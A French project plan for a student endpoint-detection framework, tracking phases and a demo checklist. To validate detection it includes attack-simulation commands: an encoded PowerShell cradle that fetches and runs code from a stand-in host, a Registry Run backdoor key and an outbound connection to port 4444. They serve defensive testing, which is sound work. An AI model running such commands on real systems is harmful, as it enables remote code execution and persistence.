# Plan d'Action : Suivre les Phases du Projet (Cahier des Charges PDF)

## Rappel des 4 Phases du PDF

```
Phase 1: Foundations      →  Semaine 1-2
Phase 2: Artifact Collection → Semaine 3-5
Phase 3: Detection Engineering → Semaine 6-8
Phase 4: Reporting & Validation → Semaine 9-10
```

**État actuel : Phase 1 terminée, Phase 2 terminée (99%), Phase 3 en cours (80%), Phase 4 en cours (70%)**

---

## 🔵 Phase 1 — Foundations (FAITE)

### Ce qui a été fait ✅
- Environnement Python configuré (venv, dépendances)
- Base de données SQLite initialisée
- Projet structuré (app/ modules)

### Ce qu'il reste à améliorer
- [ ] **Écrire le document de référence des artefacts** (inventaire de CE QUE le framework collecte et POURQUOI)
- [ ] **Installer Sysmon sur ta machine** → `Sysmon64.exe -i sysmon-config.xml`
  - Télécharger Sysmon: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
  - Télécharger une config: https://github.com/SwiftOnSecurity/sysmon-config
- [ ] **Établir un baseline** — lancer `python run.py --scan` sur une machine saine, sauvegarder les résultats

---

## 🟢 Phase 2 — Artifact Collection (FAITE à 99%)

### Ce qui a été fait ✅
- 7 collecteurs codés et fonctionnels (processus, réseau, services, eventlog, registry, tâches, Linux)
- Persistance en base de données active (les `_save_*` écrivent en SQLite)
- ~1400 artefacts collectés par scan

### Ce qu'il reste à améliorer
- [ ] **Ajouter la collecte des hashs de fichiers** (scannage des fichiers dans `C:\Windows\Temp`, `%APPDATA%`)
- [ ] **Ajouter le collecteur de services** à la persistance DB (il collecte mais ne sauvegarde pas)
- [ ] **Ajouter le collecteur Linux** à la persistance DB (idem)

---

## 🟡 Phase 3 — Detection Engineering (EN COURS — 80%)

### Ce qui a été fait ✅
- Moteur YARA chargé et fonctionnel (1 règle testée)
- Moteur Sigma chargé et fonctionnel (3 règles testées)
- Moteur IOC chargé et fonctionnel (2 hashs, 3 IPs, 3 domaines)
- Moteur heuristique fonctionnel
- Mapping MITRE ATT&CK opérationnel (30 techniques dans `techniques.json`)

### 🔴 ÉTAPE CRITIQUE : Tester la détection avec une simulation d'attaque

Pour valider que la kill chain fonctionne, tu DOIS simuler une attaque :

#### Test 1 : PowerShell malveillant (Technique T1059.001 — Execution)
```powershell
# Ouvre PowerShell et exécute :
powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkA
# Puis relance un scan : python run.py --scan
```

#### Test 2 : Persistance Registry (Technique T1547.001 — Persistence)
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MaliciousBackdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe"
# Puis relance un scan
```

#### Test 3 : Connexion sortante suspecte (Technique T1071 — C2)
```powershell
# Simule une connexion vers une IP malveillante
Test-NetConnection 185.130.5.10 -Port 4444
# Puis relance un scan
```

### Après chaque test, vérifie :
```powershell
python run.py --scan
# Puis dans le dashboard → /investigations/{session_id}
```

### Ce qu'il reste à améliorer
- [ ] **Ajouter des règles YARA supplémentaires** (télécharger depuis https://github.com/Yara-Rules/rules)
- [ ] **Ajouter des règles Sigma supplémentaires** (télécharger depuis https://github.com/SigmaHQ/sigma)
- [ ] **Vérifier que les alertes sont bien persistées en DB** après un scan
- [ ] **Tester la timeline d'attaque** : enchaîner les 3 tests ci-dessus et vérifier que le framework reconstruit la séquence

---

## 🟠 Phase 4 — Reporting & Validation (EN COURS — 70%)

### Ce qui a été fait ✅
- Dashboard avec données réelles (stats, hosts, investigations)
- Templates HTML pour toutes les pages
- API routes connectées à la DB
- Générateur de rapports

### 🔴 ÉTAPE CRITIQUE : Générer un vrai rapport d'investigation

```bash
# 1. Lance le serveur
python run.py

# 2. Va sur http://127.0.0.1:8000/reports
# 3. Clique "Generate" sur une session qui a des alertes
# 4. Vérifie que le rapport contient :
#    - Executive Summary
#    - Risk Assessment (score 0-100)
#    - MITRE ATT&CK Matrix
#    - Liste des alertes
```

### Ce qu'il reste à faire
- [ ] **Valider que le rapport s'affiche correctement**
- [ ] **Tester l'export PDF** (via le bouton "Download" ou `window.print()`)
- [ ] **Simuler un scénario complet** (attaque → collecte → détection → rapport)
- [ ] **Écrire le rapport technique de stage** (méthodologie, résultats, leçons apprises)

---

## 🎯 La Kill Chain à Valider (basée sur le PDF)

Le framework doit démontrer qu'il détecte et reconstitue CETTE chaîne :

```
1. RECONNAISSANCE    → Scan réseau, collecte infos système  (T1592, T1082)
                      → Détection : HeuristicEngine + EventLogs

2. LIVRAISON         → Téléchargement PowerShell, fichier malveillant  (T1204, T1105)
                      → Détection : YARA (fichier), Sigma (EventID 4688)

3. EXÉCUTION         → PowerShell encodé, cmd.exe suspect  (T1059.001)
                      → Détection : HeuristicEngine (processus suspects)

4. PERSISTANCE       → Clé Registry Run, tâche planifiée  (T1547.001, T1053)
                      → Détection : RegistryCollector + HeuristicEngine

5. C2                → Connexion sortante vers IP/donnaine malveillant  (T1071)
                      → Détection : NetworkCollector + IOCEngine

6. IMPACT            → Chiffrement fichiers, création de processus anormaux  (T1486)
                      → Détection : YARA + HeuristicEngine
```

### Test final complet (30 min)
```powershell
# 1. Nettoie la base
Remove-Item lightedr.db; python setup_db.py

# 2. Simule l'attaque en 3 étapes :
#    Étape A : PowerShell encodé (Execution)
#    Étape B : Ajout clé Registry Run (Persistence)
#    Étape C : Connexion vers IP malveillante (C2)

# 3. Lance la collecte + détection
python run.py --scan

# 4. Lance le serveur et vérifie le dashboard
python run.py
# http://127.0.0.1:8000/alerts  →  doit montrer des alertes
# http://127.0.0.1:8000/mitre   →  doit montrer les techniques couvertes
# http://127.0.0.1:8000/reports →  génère un rapport
```

---

## 📋 Check-list pour la Soutenance

- [ ] **Démo fonctionnelle** : scan → alertes → rapport (30 min chrono)
- [ ] **Mapping MITRE ATT&CK visible** : au moins 3 techniques différentes
- [ ] **Timeline d'attaque** : montre la séquence temporelle des événements
- [ ] **Dashboard avec données réelles** : pas de chiffres factices
- [ ] **Rapport PDF exportable** : un clic → document structuré
- [ ] **Documentation du code** : README à jour, commentaires clés
